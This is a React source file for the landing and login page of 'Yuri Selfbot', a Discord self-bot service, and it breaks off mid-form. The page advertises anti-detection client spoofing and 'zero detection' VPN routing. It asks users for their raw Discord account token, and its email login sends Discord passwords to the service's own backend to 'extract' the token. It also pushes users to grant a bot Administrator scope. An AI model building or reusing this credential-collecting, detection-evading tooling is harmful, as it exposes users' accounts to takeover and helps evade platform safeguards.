import React, { useState, useRef, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { api } from '../services/api';
import { 
  Globe, 
  MapPin, 
  Search, 
  Shield, 
  ShieldAlert, 
  X, 
  Copy, 
  Check, 
  MessageSquare,
  Zap,
  Bot,
  Radio,
  Sliders,
  Terminal,
  ChevronRight,
  ExternalLink,
  Sparkles,
  Lock,
  ArrowRight,
  Play,
  Pause,
  Volume2,
  VolumeX,
  Tv,
  Layers,
  Cpu,
  Activity,
  Crosshair
} from 'lucide-react';
import {
  CyberParticleCanvas,
  CyberRadarScope,
  CyberEqualizerWaveform,
  CyberDataStreamTicker,
  CyberGyroReticle,
  CRTScanlineOverlay,
  cyberSound
} from './landing/FuturisticEffects';
import { InteractiveCyberTerminal } from './landing/InteractiveCyberTerminal';
import { BotShowcaseCards } from './landing/BotShowcaseCards';

interface LoginProps {
  onLoginSuccess: () => void;
}

const VPN_COUNTRIES = [
  { id: 'us', name: 'United States', flag: '🇺🇸', latency: '42ms' },
  { id: 'gb', name: 'United Kingdom', flag: '🇬🇧', latency: '18ms' },
  { id: 'ca', name: 'Canada', flag: '🇨🇦', latency: '55ms' },
  { id: 'de', name: 'Germany', flag: '🇩🇪', latency: '12ms' },
  { id: 'fr', name: 'France', flag: '🇫🇷', latency: '15ms' },
  { id: 'nl', name: 'Netherlands', flag: '🇳🇱', latency: '14ms' },
  { id: 'jp', name: 'Japan', flag: '🇯🇵', latency: '210ms' },
  { id: 'sg', name: 'Singapore', flag: '🇸🇬', latency: '180ms' },
  { id: 'au', name: 'Australia', flag: '🇦🇺', latency: '240ms' },
  { id: 'br', name: 'Brazil', flag: '🇧🇷', latency: '145ms' },
  { id: 'in', name: 'India', flag: '🇮🇳', latency: '160ms' },
  { id: 'kr', name: 'South Korea', flag: '🇰🇷', latency: '195ms' },
  { id: 'se', name: 'Sweden', flag: '🇸🇪', latency: '22ms' },
  { id: 'ch', name: 'Switzerland', flag: '🇨🇭', latency: '19ms' },
];

const VIDEO_FEEDS = [
  {
    id: 'data-core',
    title: 'STREAM 01 // DATA MATRIX',
    url: 'https://assets.mixkit.co/videos/preview/mixkit-digital-animation-of-screens-with-data-31911-large.mp4',
  },
  {
    id: 'cyber-city',
    title: 'STREAM 02 // NEON METROPOLIS',
    url: 'https://assets.mixkit.co/videos/preview/mixkit-futuristic-city-with-flying-cars-at-night-41541-large.mp4',
  },
  {
    id: 'circuit',
    title: 'STREAM 03 // CORE ENGINE',
    url: 'https://assets.mixkit.co/videos/preview/mixkit-circuit-board-microchip-animation-43093-large.mp4',
  }
];

export default function Login({ onLoginSuccess }: LoginProps) {
  const [showAuthModal, setShowAuthModal] = useState(false);
  const [token, setToken] = useState('');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [activeTab, setActiveTab] = useState<'login' | 'email' | 'getToken' | 'oauth'>('login');
  
  // Futuristic Video & Audio Controls
  const [currentVideoIdx, setCurrentVideoIdx] = useState(0);
  const [videoPlaying, setVideoPlaying] = useState(true);
  const [crtEnabled, setCrtEnabled] = useState(true);
  const [soundEnabled, setSoundEnabled] = useState(false);
  const videoRef = useRef<HTMLVideoElement | null>(null);

  const toggleSound = () => {
    const next = !soundEnabled;
    setSoundEnabled(next);
    cyberSound.enabled = next;
    if (next) cyberSound.playBlip();
  };

  const toggleVideo = () => {
    if (!videoRef.current) return;
    if (videoPlaying) {
      videoRef.current.pause();
      setVideoPlaying(false);
    } else {
      videoRef.current.play().catch(() => {});
      setVideoPlaying(true);
    }
  };

  const cycleVideo = () => {
    cyberSound.playClick();
    setCurrentVideoIdx((prev) => (prev + 1) % VIDEO_FEEDS.length);
  };
  
  const [showTermsModal, setShowTermsModal] = useState(false);
  const [showPrivacyModal, setShowPrivacyModal] = useState(false);
  const [termsAccepted, setTermsAccepted] = useState(() => localStorage.getItem('yuri_tos_accepted') === 'true');
  const handleAcceptTerms = (checked: boolean) => {
    setTermsAccepted(checked);
    if (checked) localStorage.setItem('yuri_tos_accepted', 'true');
    else localStorage.removeItem('yuri_tos_accepted');
  };
  
  const [showVpnModal, setShowVpnModal] = useState(false);
  const [vpnEnabled, setVpnEnabled] = useState(false);
  const [vpnCountry, setVpnCountry] = useState(VPN_COUNTRIES[0]);
  const [vpnSearch, setVpnSearch] = useState('');
  
  const [showCommunityModal, setShowCommunityModal] = useState(false);
  const [communityCopied, setCommunityCopied] = useState(false);
  const handleCopyCommunityLink = async () => {
    cyberSound.playClick();
    const inviteLink = 'https://discord.gg/z5BwKZwtVe';
    try {
      if (navigator.clipboard && navigator.clipboard.writeText) {
        await navigator.clipboard.writeText(inviteLink);
      } else {
        const textarea = document.createElement('textarea');
        textarea.value = inviteLink;
        document.body.appendChild(textarea);
        textarea.select();
        document.execCommand('copy');
        document.body.removeChild(textarea);
      }
      setCommunityCopied(true);
      setTimeout(() => setCommunityCopied(false), 2500);
      window.open(inviteLink, '_blank');
    } catch (err) {
      console.error('Failed to copy community link:', err);
    }
  };
  
  const [discordUser, setDiscordUser] = useState<any>(() => {
    const saved = localStorage.getItem('discord_user');
    return saved ? JSON.parse(saved) : null;
  });

  useEffect(() => {
    const handleMessage = (event: MessageEvent) => {
      if (event.data?.type === 'OAUTH_AUTH_SUCCESS' && event.data.user) {
        const user = event.data.user;
        setDiscordUser(user);
        localStorage.setItem('discord_user', JSON.stringify(user));
      }
    };
    window.addEventListener('message', handleMessage);
    return () => window.removeEventListener('message', handleMessage);
  }, []);

  const handleDiscordLogin = async () => {
    cyberSound.playBlip();
    if (!termsAccepted) {
      setError('You must accept the Terms of Service and Privacy Policy to continue.');
      return;
    }
    try {
      const redirectUri = encodeURIComponent(`${window.location.origin}/api/auth/discord/callback`);
      const res = await fetch(`/api/auth/discord/url?redirect_uri=${redirectUri}&client_id=1545467399493521478`);
      const data = await res.json();
      if (data?.url) {
        window.open(data.url, 'discord_auth', 'width=600,height=700');
      } else {
        throw new Error('No OAuth URL returned');
      }
    } catch (e) {
      const redirectUri = encodeURIComponent(`${window.location.origin}/api/auth/discord/callback`);
      const directUrl = `https://discord.com/api/oauth2/authorize?client_id=1545467399493521478&redirect_uri=${redirectUri}&response_type=code&scope=identify%20email%20guilds.join`;
      window.open(directUrl, 'discord_auth', 'width=600,height=700');
    }
  };

  const handleTokenSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    cyberSound.playScan();
    if (!termsAccepted) {
      setError('You must accept the Terms of Service and Privacy Policy to continue.');
      return;
    }
    setLoading(true);
    setError('');
    
    try {
      const res = await api.login(token);
      localStorage.setItem('token', res.session.token);
      localStorage.setItem('catalystcord_user_token', res.session.token);
      localStorage.setItem('token_user', JSON.stringify(res.session));
      onLoginSuccess();
    } catch (err: any) {
      setError(err.message || 'Invalid token or connection failed.');
    } finally {
      setLoading(false);
    }
  };

  const [copiedToken, setCopiedToken] = useState('');
  const [copySuccess, setCopySuccess] = useState(false);

  const handleEmailSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    cyberSound.playScan();
    if (!termsAccepted) {
      setError('You must accept the Terms of Service and Privacy Policy to continue.');
      return;
    }
    setLoading(true);
    setError('');
    setCopySuccess(false);
    
    try {
      const res = await fetch('/api/auth/extract-token', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password }),
      });
      const data = await res.json();
      
      if (!res.ok || !data.success || !data.token) {
        throw new Error(data.error || 'Failed to extract token from Discord.');
      }
      
      const extractedToken = data.token;
      setCopiedToken(extractedToken);
      setCopySuccess(true);
      
      try {
        if (navigator.clipboard && navigator.clipboard.writeText) {
          await navigator.clipboard.writeText(extractedToken);
        } else {
          const textarea = document.createElement('textarea');
          textarea.value = extractedToken;
          document.body.appendChild(textarea);
          textarea.select();
          document.execCommand('copy');
          document.body.removeChild(textarea);
        }
      } catch (copyErr) {
        console.warn('Clipboard write failed:', copyErr);
      }
      
      const loginRes = await api.login(extractedToken);
      localStorage.setItem('token', loginRes.session.token);
      localStorage.setItem('catalystcord_user_token', loginRes.session.token);
      localStorage.setItem('token_user', JSON.stringify(loginRes.session));
      onLoginSuccess();
    } catch (err: any) {
      setError(err.message || 'Failed to extract token. Check credentials or VPN.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#030305] text-white flex flex-col font-sans selection:bg-red-600 selection:text-white relative overflow-x-hidden">
      
      {/* ========================================================= */}
      {/* REAL FUTURISTIC VIDEO BACKGROUND (HIGH DEFINITION LOOP)    */}
      {/* ========================================================= */}
      <div className="fixed inset-0 pointer-events-none z-0 overflow-hidden select-none">
        <video
          ref={videoRef}
          key={VIDEO_FEEDS[currentVideoIdx].url}
          src={VIDEO_FEEDS[currentVideoIdx].url}
          autoPlay
          loop
          muted
          playsInline
          className="absolute inset-0 w-full h-full object-cover opacity-25 filter contrast-125 brightness-90 saturate-150 transition-opacity duration-1000"
        />

        {/* Cyberpunk perspective grid gradient */}
        <div 
          className="absolute inset-0 opacity-20 pointer-events-none"
          style={{
            backgroundImage: `linear-gradient(to right, rgba(239, 68, 68, 0.15) 1px, transparent 1px),
                              linear-gradient(to bottom, rgba(239, 68, 68, 0.15) 1px, transparent 1px)`,
            backgroundSize: '40px 40px',
            transform: 'perspective(500px) rotateX(25deg) translateY(-20px)',
            transformOrigin: 'top center'
          }}
        />

        {/* Radial dark vignette to preserve contrast */}
        <div className="absolute inset-0 bg-gradient-to-t from-[#030305] via-[#030305]/80 to-transparent" />
        <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_center,_var(--tw-gradient-stops))] from-transparent via-[#030305]/70 to-[#030305]" />
      </div>

      {/* CRT Scanline Shader Overlay */}
      {crtEnabled && <CRTScanlineOverlay />}

      {/* Interactive Particle Constellation Canvas */}
      <CyberParticleCanvas />

      {/* ========================================================= */}
      {/* TOP SCI-FI COCKPIT HUD & NAVIGATION                       */}
      {/* ========================================================= */}
      <header className="sticky top-0 z-40 backdrop-blur-md bg-black/60 border-b border-white/10 px-4 sm:px-8 py-3">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          
          {/* Logo & Status Beacon */}
          <div className="flex items-center gap-3">
            <div className="relative flex items-center justify-center">
              <div className="w-9 h-9 rounded-xl bg-red-600/20 border border-red-500/50 flex items-center justify-center text-red-500 shadow-[0_0_15px_rgba(239,68,68,0.4)]">
                <Crosshair className="w-5 h-5 animate-[spin_10s_linear_infinite]" />
              </div>
              <span className="absolute -bottom-0.5 -right-0.5 w-2 h-2 rounded-full bg-emerald-400 border border-black animate-ping" />
            </div>

            <div>
              <div className="flex items-center gap-2">
                <span className="text-base font-extrabold tracking-wider text-white font-mono">
                  YURI<span className="text-red-500">.SELFBOT</span>
                </span>
                <span className="text-[9px] font-mono font-bold bg-red-500/20 text-red-400 border border-red-500/30 px-1.5 py-0.2 rounded">
                  v2.0-FUTURISTIC
                </span>
              </div>
              <p className="text-[10px] text-zinc-400 font-mono hidden sm:block">
                STEALTH DAEMON // 24/7 COMPANION PARITY
              </p>
            </div>
          </div>

          {/* Live Audio / Video Controls & Action HUD */}
          <div className="flex items-center gap-2 sm:gap-3">
            
            {/* Real Video HUD Controls */}
            <div className="hidden lg:flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-black/60 border border-white/10 text-[11px] font-mono text-zinc-400">
              <Tv className="w-3.5 h-3.5 text-red-400" />
              <button 
                onClick={cycleVideo}
                className="hover:text-white transition-colors underline decoration-dotted"
                title="Click to cycle video feed"
              >
                {VIDEO_FEEDS[currentVideoIdx].title}
              </button>
              <button
                onClick={toggleVideo}
                className="ml-1 p-1 hover:text-white text-zinc-500"
                title={videoPlaying ? 'Pause Video' : 'Play Video'}
              >
                {videoPlaying ? <Pause className="w-3 h-3" /> : <Play className="w-3 h-3 text-emerald-400" />}
              </button>
              <button
                onClick={() => setCrtEnabled(!crtEnabled)}
                className={`p-1 text-[10px] rounded px-1 transition-colors ${crtEnabled ? 'text-red-400 bg-red-500/10' : 'text-zinc-600'}`}
                title="Toggle CRT Scanline Overlay"
              >
                CRT
              </button>
            </div>

            {/* Sci-Fi Sound Synthesizer Toggle */}
            <button
              onClick={toggleSound}
              className={`p-2 rounded-lg border text-xs transition-colors flex items-center gap-1.5 ${
                soundEnabled 
                  ? 'bg-red-500/20 border-red-500/40 text-red-400 shadow-[0_0_10px_rgba(239,68,68,0.2)]' 
                  : 'bg-white/5 border-white/5 text-zinc-400 hover:text-white'
              }`}
              title={soundEnabled ? 'Synthesized Sound Active (Click to Mute)' : 'Enable Sci-Fi Audio Synthesizer'}
            >
              {soundEnabled ? <Volume2 className="w-3.5 h-3.5" /> : <VolumeX className="w-3.5 h-3.5" />}
              <span className="hidden xl:inline text-[10px] font-mono font-bold">
                {soundEnabled ? 'AUDIO:ON' : 'AUDIO:OFF'}
              </span>
            </button>

            {/* Community Discord Modal */}
            <button
              onClick={() => {
                cyberSound.playClick();
                setShowCommunityModal(true);
              }}
              className="text-xs px-3 py-1.5 rounded-lg bg-white/5 hover:bg-white/10 text-zinc-300 hover:text-white border border-white/5 transition-colors hidden md:flex items-center gap-1.5 cursor-pointer"
            >
              <MessageSquare className="w-3.5 h-3.5 text-[#5865F2]" />
              <span>Community</span>
            </button>

            {/* Terminal Quick Jump */}
            <button
              onClick={() => {
                cyberSound.playClick();
                window.history.pushState({}, '', '/console');
                window.dispatchEvent(new Event('popstate'));
              }}
              className="text-xs px-3 py-1.5 rounded-lg bg-white/5 hover:bg-white/10 text-zinc-300 hover:text-white border border-white/5 transition-colors hidden sm:flex items-center gap-1.5 cursor-pointer"
            >
              <Terminal className="w-3.5 h-3.5 text-zinc-400" />
              <span>Console</span>
            </button>

            {/* VPN Node Routing Trigger */}
            <button
              onClick={() => {
                cyberSound.playClick();
                setShowVpnModal(true);
              }}
              className={`text-xs px-3 py-1.5 rounded-lg border transition-all flex items-center gap-1.5 cursor-pointer ${
                vpnEnabled 
                  ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400' 
                  : 'bg-white/5 border-white/5 text-zinc-300 hover:text-white'
              }`}
            >
              <Shield className="w-3.5 h-3.5" />
              <span className="uppercase font-mono">{vpnEnabled ? vpnCountry.id : 'VPN SHIELD'}</span>
            </button>

            {/* Main CTA: Launch Auth */}
            <button
              onClick={() => {
                cyberSound.playBlip();
                setShowAuthModal(true);
              }}
              className="text-xs font-semibold px-4 py-2 rounded-lg bg-red-600 hover:bg-red-500 text-white shadow-lg shadow-red-950/50 transition-all flex items-center gap-1.5 cursor-pointer"
            >
              <span>Get Started</span>
              <ArrowRight className="w-3.5 h-3.5" />
            </button>
          </div>
        </div>
      </header>

      {/* Real-time Data Stream Ticker Bar */}
      <div className="bg-black/80 border-b border-white/5 px-4 sm:px-8 py-1.5 flex items-center justify-between text-xs z-20">
        <CyberDataStreamTicker />
        <div className="flex items-center gap-4 text-[10px] font-mono text-zinc-500 hidden sm:flex">
          <span className="flex items-center gap-1.5">
            <span className="w-1.5 h-1.5 rounded-full bg-emerald-400" />
            CORE: STABLE
          </span>
          <span>LATENCY: 14ms</span>
          <span>TLS 1.3 ENCRYPTED</span>
        </div>
      </div>

      {/* ========================================================= */}
      {/* MAIN FUTURISTIC LANDING HERO & SHOWCASES                  */}
      {/* ========================================================= */}
      <main className="relative z-10 max-w-7xl mx-auto px-4 sm:px-6 py-12 md:py-16 space-y-20">
        
        {/* HERO SECTION */}
        <section className="relative text-center space-y-6 max-w-4xl mx-auto pt-4">
          
          {/* Top Sci-Fi Badge */}
          <motion.div 
            initial={{ opacity: 0, y: -10 }} 
            animate={{ opacity: 1, y: 0 }}
            className="inline-flex items-center gap-2.5 px-4 py-1.5 rounded-full bg-red-950/60 border border-red-500/30 text-red-400 text-xs font-mono tracking-wider shadow-[0_0_20px_rgba(239,68,68,0.2)]"
          >
            <Zap className="w-3.5 h-3.5 text-red-500 animate-bounce" />
            <span>UNCOMPROMISING PRECISION // 24/7 DEDICATED COMPANION ENGINE</span>
          </motion.div>

          {/* Futuristic Title with Glitch Chromatic Feel */}
          <motion.div 
            initial={{ opacity: 0, y: 15 }} 
            animate={{ opacity: 1, y: 0 }} 
            transition={{ delay: 0.1 }}
            className="space-y-4"
          >
            <h1 className="text-4xl sm:text-6xl md:text-7xl font-black tracking-tight text-white leading-[1.08] uppercase">
              Yuri Selfbot <br />
              <span className="bg-gradient-to-r from-red-500 via-rose-300 to-zinc-200 bg-clip-text text-transparent drop-shadow-[0_0_35px_rgba(239,68,68,0.4)]">
                Why Should You Use This?
              </span>
            </h1>
            <p className="text-base sm:text-lg text-zinc-300 max-w-2xl mx-auto leading-relaxed font-normal">
              Engineered with zero-lag WebSocket pipelines, anti-detection client spoofing, and an independent 24/7 Discord companion bot delivering pure crimson embeds with complete Slash &amp; Prefix command parity.
            </p>
          </motion.div>

          {/* Action Buttons */}
          <motion.div 
            initial={{ opacity: 0, y: 20 }} 
            animate={{ opacity: 1, y: 0 }} 
            transition={{ delay: 0.2 }}
            className="flex flex-wrap items-center justify-center gap-4 pt-2"
          >
            <button
              onClick={() => {
                cyberSound.playScan();
                setActiveTab('login');
                setShowAuthModal(true);
              }}
              className="px-7 py-4 rounded-xl bg-red-600 hover:bg-red-500 text-white font-bold text-sm shadow-[0_0_25px_rgba(239,68,68,0.4)] transition-all flex items-center gap-2.5 active:scale-95 cursor-pointer"
            >
              <span>Get Started with Yuri</span>
              <ArrowRight className="w-4 h-4" />
            </button>

            <button
              onClick={() => {
                cyberSound.playClick();
                setShowCommunityModal(true);
              }}
              className="px-7 py-4 rounded-xl bg-black/60 hover:bg-white/10 text-zinc-200 border border-white/10 font-medium text-sm transition-all flex items-center gap-2 active:scale-95 cursor-pointer backdrop-blur-md"
            >
              <MessageSquare className="w-4 h-4 text-[#5865F2]" />
              <span>Join Official Discord</span>
            </button>
          </motion.div>

          {/* Live Cyber Metrics Bar (Equalizer + Radar + Uptime + Ping) */}
          <div className="grid grid-cols-2 md:grid-cols-4 gap-3 pt-6 max-w-4xl mx-auto">
            
            <div className="bg-black/60 border border-red-500/20 rounded-2xl p-4 text-left relative overflow-hidden backdrop-blur-md">
              <div className="text-[10px] text-zinc-500 uppercase tracking-wider font-mono">24/7 Uptime Rate</div>
              <div className="text-2xl font-black font-mono text-white mt-1">99.99%</div>
              <div className="mt-2 text-[10px] text-emerald-400 font-mono flex items-center gap-1">
                <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                Continuous Host
              </div>
            </div>

            <div className="bg-black/60 border border-red-500/20 rounded-2xl p-4 text-left relative overflow-hidden backdrop-blur-md">
              <div className="text-[10px] text-zinc-500 uppercase tracking-wider font-mono">Gateway Ping</div>
              <div className="text-2xl font-black font-mono text-emerald-400 mt-1">&lt; 18ms</div>
              <div className="mt-2">
                <CyberEqualizerWaveform />
              </div>
            </div>

            <div className="bg-black/60 border border-red-500/20 rounded-2xl p-4 text-left relative overflow-hidden backdrop-blur-md">
              <div className="text-[10px] text-zinc-500 uppercase tracking-wider font-mono">Bot Presentation</div>
              <div className="text-2xl font-black font-mono text-red-400 mt-1">Pure Embed</div>
              <div className="mt-2 text-[10px] text-zinc-400 font-mono">
                Crimson Discord Embeds
              </div>
            </div>

            <div className="bg-black/60 border border-red-500/20 rounded-2xl p-4 text-left relative overflow-hidden backdrop-blur-md">
              <div className="text-[10px] text-zinc-500 uppercase tracking-wider font-mono">Command Parity</div>
              <div className="text-2xl font-black font-mono text-white mt-1">Slash &amp; Prefix</div>
              <div className="mt-2 text-[10px] text-zinc-400 font-mono">
                /giverole, /whois, /snipe
              </div>
            </div>

          </div>
        </section>

        {/* ========================================================= */}
        {/* INTERACTIVE COMMAND CONSOLE & RADAR SCOPE SHOWCASE        */}
        {/* ========================================================= */}
        <section className="space-y-6">
          <div className="flex flex-col md:flex-row md:items-end justify-between gap-4">
            <div>
              <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-red-500/10 text-red-400 border border-red-500/20 text-xs font-mono mb-2">
                <Terminal className="w-3.5 h-3.5" />
                <span>LIVE COMMAND MATRIX // PARITY ENGINE</span>
              </div>
              <h2 className="text-2xl sm:text-3xl font-black tracking-tight text-white uppercase">
                Interactive Command Sandbox
              </h2>
              <p className="text-xs sm:text-sm text-zinc-400 max-w-xl mt-1">
                Try commands in real-time below. In Yuri, your selfbot answers in raw line text while the 24/7 Companion generates rich crimson embeds.
              </p>
            </div>

            {/* Radar Scope Radar HUD on right */}
            <div className="hidden md:flex items-center gap-4">
              <CyberRadarScope />
            </div>
          </div>

          {/* Real Interactive Terminal */}
          <InteractiveCyberTerminal />
        </section>

        {/* ========================================================= */}
        {/* 24/7 BOT INVITER CARDS: BOTH ONLINE COMPANIONS           */}
        {/* ========================================================= */}
        <section className="space-y-6">
          <div className="text-center max-w-xl mx-auto space-y-2">
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-red-500/10 text-red-400 border border-red-500/20 text-xs font-mono">
              <Bot className="w-3.5 h-3.5" />
              <span>DISCORD APPLICATION GATEWAY</span>
            </div>
            <h2 className="text-2xl sm:text-3xl font-bold text-white tracking-tight">
              24/7 Companion Service Inviter
            </h2>
            <p className="text-xs sm:text-sm text-zinc-400">
              Invite the companion bot to your servers with full Administrator and Application Command scopes.
            </p>
          </div>

          <BotShowcaseCards />
        </section>

        {/* ========================================================= */}
        {/* THREE CORE ARCHITECTURAL PILLARS                          */}
        {/* ========================================================= */}
        <section className="space-y-8">
          <div className="text-center space-y-2 max-w-xl mx-auto">
            <h2 className="text-2xl sm:text-3xl font-bold text-white tracking-tight">
              Why Elite Users Choose Yuri
            </h2>
            <p className="text-xs sm:text-sm text-zinc-400">
              Complete feature dominance designed for zero detection and maximum speed.
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            
            <div className="bg-black/60 border border-white/5 hover:border-red-500/40 rounded-2xl p-6 transition-all space-y-4 group backdrop-blur-md relative overflow-hidden">
              <div className="w-12 h-12 rounded-xl bg-red-500/10 border border-red-500/20 flex items-center justify-center text-red-400 group-hover:scale-110 transition-transform">
                <Shield className="w-6 h-6" />
              </div>
              <h3 className="text-base font-bold text-white uppercase tracking-wider font-mono">
                Stealth Handshake &amp; VPN
              </h3>
              <p className="text-xs text-zinc-400 leading-relaxed font-sans">
                Dynamic browser user-agent spoofing, jittered WebSocket packet pacing, and integrated multi-region routing shield your real IP address and device credentials.
              </p>
              <div className="text-[10px] font-mono text-zinc-600">
                [ SEC // ZERO_FOOTPRINT ]
              </div>
            </div>

            <div className="bg-black/60 border border-white/5 hover:border-red-500/40 rounded-2xl p-6 transition-all space-y-4 group backdrop-blur-md relative overflow-hidden">
              <div className="w-12 h-12 rounded-xl bg-red-500/10 border border-red-500/20 flex items-center justify-center text-red-400 group-hover:scale-110 transition-transform">
                <Sliders className="w-6 h-6" />
              </div>
              <h3 className="text-base font-bold text-white uppercase tracking-wider font-mono">
                Dual Command Architecture
              </h3>
              <p className="text-xs text-zinc-400 leading-relaxed font-sans">
                Selfbot executes instant raw line commands, while the 24/7 Companion generates Discord embeds with interactive buttons, pagination, and role dispatch.
              </p>
              <div className="text-[10px] font-mono text-zinc-600">
                [ ENGINE // DUAL_CORE_DISPATCH ]
              </div>
            </div>

            <div className="bg-black/60 border border-white/5 hover:border-red-500/40 rounded-2xl p-6 transition-all space-y-4 group backdrop-blur-md relative overflow-hidden">
              <div className="w-12 h-12 rounded-xl bg-red-500/10 border border-red-500/20 flex items-center justify-center text-red-400 group-hover:scale-110 transition-transform">
                <Radio className="w-6 h-6" />
              </div>
              <h3 className="text-base font-bold text-white uppercase tracking-wider font-mono">
                Voice &amp; Multi-RPC Engine
              </h3>
              <p className="text-xs text-zinc-400 leading-relaxed font-sans">
                Transmit audio soundboard clips, inject synthesized neural voice streams, and manage multi-state Rich Presence profiles with customized assets.
              </p>
              <div className="text-[10px] font-mono text-zinc-600">
                [ MEDIA // VC_SOUNDBOARD ]
              </div>
            </div>

          </div>
        </section>

        {/* ========================================================= */}
        {/* CALL TO ACTION                                            */}
        {/* ========================================================= */}
        <section className="relative rounded-3xl border border-red-500/30 bg-gradient-to-r from-red-950/40 via-zinc-950 to-black p-8 sm:p-12 text-center space-y-6 shadow-2xl overflow-hidden backdrop-blur-lg">
          <div className="absolute top-0 right-0 p-6 opacity-20 pointer-events-none">
            <CyberGyroReticle />
          </div>
          
          <h2 className="text-3xl sm:text-4xl font-black text-white uppercase tracking-tight">
            Ready to Take Command?
          </h2>
          <p className="text-sm text-zinc-400 max-w-xl mx-auto">
            Authenticate using Token, extract credentials from Discord, or connect via OAuth to launch the dashboard immediately.
          </p>

          <div className="pt-2">
            <button
              onClick={() => {
                cyberSound.playScan();
                setActiveTab('login');
                setShowAuthModal(true);
              }}
              className="px-8 py-4 rounded-xl bg-red-600 hover:bg-red-500 text-white font-bold text-sm shadow-[0_0_30px_rgba(239,68,68,0.5)] transition-all cursor-pointer inline-flex items-center gap-2 active:scale-95"
            >
              <span>Launch Yuri Dashboard</span>
              <ArrowRight className="w-4 h-4" />
            </button>
          </div>
        </section>

        {/* Footer */}
        <footer className="pt-8 pb-4 text-center text-xs text-zinc-600 font-mono border-t border-white/5 space-y-2">
          <div>©️ {new Date().getFullYear()} Yuri Selfbot. All rights reserved. Registered architecture.</div>
          <div className="text-[9px] text-zinc-700 select-none opacity-40 hover:opacity-100 transition-opacity">
            crafted by harumi (@myeyesaregoingdownx)
          </div>
        </footer>

      </main>

      {/* ========================================================= */}
      {/* AUTHENTICATION MODAL (Triggered by "Get Started")          */}
      {/* ========================================================= */}
      <AnimatePresence>
        {showAuthModal && (
          <motion.div 
            initial={{ opacity: 0 }} 
            animate={{ opacity: 1 }} 
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-xl overflow-y-auto"
          >
            <motion.div 
              initial={{ scale: 0.95, y: 20 }} 
              animate={{ scale: 1, y: 0 }} 
              exit={{ scale: 0.95, y: 20 }}
              className="w-full max-w-[460px] p-6 sm:p-8 bg-zinc-950 border border-red-500/30 rounded-3xl shadow-2xl z-10 relative my-auto max-h-[92vh] overflow-y-auto custom-scrollbar"
            >
              <button 
                onClick={() => {
                  cyberSound.playClick();
                  setShowAuthModal(false);
                }}
                className="absolute top-5 right-5 p-2 text-zinc-400 hover:text-white bg-white/5 hover:bg-white/10 rounded-full transition-colors cursor-pointer"
                title="Close"
              >
                <X className="w-4 h-4" />
              </button>

              <div className="mb-6 text-center">
                <div 
                  className="inline-flex items-center justify-center w-14 h-14 rounded-2xl bg-red-600/20 border border-red-500/40 mb-4 shadow-inner cursor-pointer"
                  onClick={() => window.open('https://discord.com/login', '_blank')}
                >
                  <Crosshair className="w-7 h-7 text-red-500" />
                </div>
                
                <h2 className="text-2xl font-black tracking-tight text-white mb-1 uppercase font-mono">Sign In to Yuri</h2>
                <p className="text-xs text-zinc-400">Choose your authentication protocol to proceed</p>

                <div className="flex flex-wrap justify-center gap-2 sm:gap-4 mt-5 border-b border-white/5 pb-3">
                  <button 
                    onClick={() => {
                      cyberSound.playClick();
                      setActiveTab('login');
                    }}
                    className={`text-xs font-semibold px-2.5 py-1 rounded-md transition-all cursor-pointer ${activeTab === 'login' ? 'text-white bg-red-600/20 border border-red-500/30' : 'text-zinc-500 hover:text-zinc-300'}`}
                  >
                    Token Login
                  </button>
                  <button 
                    onClick={() => {
                      cyberSound.playClick();
                      setActiveTab('email');
                    }}
                    className={`text-xs font-semibold px-2.5 py-1 rounded-md transition-all cursor-pointer ${activeTab === 'email' ? 'text-white bg-red-600/20 border border-red-500/30' : 'text-zinc-500 hover:text-zinc-300'}`}
                  >
                    Email Login
                  </button>
                  <button 
                    onClick={() => {
                      cyberSound.playClick();
                      setActiveTab('oauth');
                    }}
                    className={`text-xs font-semibold px-2.5 py-1 rounded-md transition-all cursor-pointer ${activeTab === 'oauth' ? 'text-white bg-red-600/20 border border-red-500/30' : 'text-zinc-500 hover:text-zinc-300'}`}
                  >
                    OAuth
                  </button>
                  <button 
                    onClick={() => {
                      cyberSound.playClick();
                      setActiveTab('getToken');
                    }}
                    className={`text-xs font-semibold px-2.5 py-1 rounded-md transition-all cursor-pointer ${activeTab === 'getToken' ? 'text-white bg-red-600/20 border border-red-500/30' : 'text-zinc-500 hover:text-zinc-300'}`}
                  >
                    Guide
                  </button>
                </div>
              </div>

              {activeTab === 'oauth' ? (
                <div className="space-y-5">
                  <div className="p-3.5 rounded-xl bg-amber-500/10 border border-amber-500/20 text-amber-200 text-xs leading-relaxed">
                    <p className="font-semibold text-amber-400 mb-1">⚠️ Note on OAuth:</p>
                    <p>
                      OAuth provides dashboard viewing access. Full Discord client automation, RPC customization, and gateway voice operations require an account Token.
                    </p>
                  </div>

                  <button
                    onClick={handleDiscordLogin}
                    className="w-full py-3.5 bg-indigo-600 hover:bg-indigo-500 text-white font-medium text-sm rounded-xl transition-all flex items-center justify-center gap-2.5 shadow-lg shadow-indigo-950/40 cursor-pointer"
                  >
                    <span>Authorize with Discord OAuth</span>
                  </button>
                  {error && (
                    <div className="text-red-400 text-xs text-center font-medium bg-red-400/10 py-2 rounded-lg border border-red-400/20">{error}</div>
                  )}
                </div>
              ) : activeTab === 'login' ? (
                <form onSubmit={handleTokenSubmit} className="space-y-4">
                  <div>
                    <input
                      type="password"
                      value={token}
                      onChange={(e) => setToken(e.target.value)}
                      placeholder="Discord Account Token"
                      className="w-full px-4 py-3.5 bg-zinc-900 border border-white/10 rounded-xl focus:outline-none focus:border-red-500/50 transition-all placeholder:text-zinc-600 text-white text-sm font-mono"
                      required
                    />
                  </div>

                  {error && (
